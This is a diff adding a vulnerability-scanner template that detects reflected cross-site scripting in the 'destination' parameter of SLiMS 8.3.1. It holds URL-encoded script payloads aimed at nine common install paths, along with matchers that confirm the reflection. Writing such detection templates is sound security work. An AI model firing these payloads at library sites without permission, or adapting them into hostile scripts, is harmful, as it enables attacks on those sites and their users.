@@ -1,0 +1,38 @@
+id: slims-8-akasia-xss
+brief:
+    title: Senayan Library Management System v8.3.1 (Akasia) - Cross-Site Scripting
+    by: nblirwn
+    level: medium
+    about: SLiMS 8.3.1 (Akasia) has a `destination` parameter that is vulnerable to reflected XSS. However, ensure that the `p` parameter points to the 'member'. Additional google dork 'intext:"SLiMS 8.3.1 (A...
+    label:
+        - senayan
+        - xss
+        - slims
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+        - '{{BaseURL}}/perpustakaan/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+        - '{{BaseURL}}/slims/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+        - '{{BaseURL}}/perpustakaan/slims/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+        - '{{BaseURL}}/e-library/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+        - '{{BaseURL}}/perpus/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+        - '{{BaseURL}}/digilib/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+        - '{{BaseURL}}/akasia/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+        - '{{BaseURL}}/library/index.php?destination=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=member'
+      signs:
+        - "on": word
+          has:
+            - <script>alert(document.domain)</script>
+            - SLiMS
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
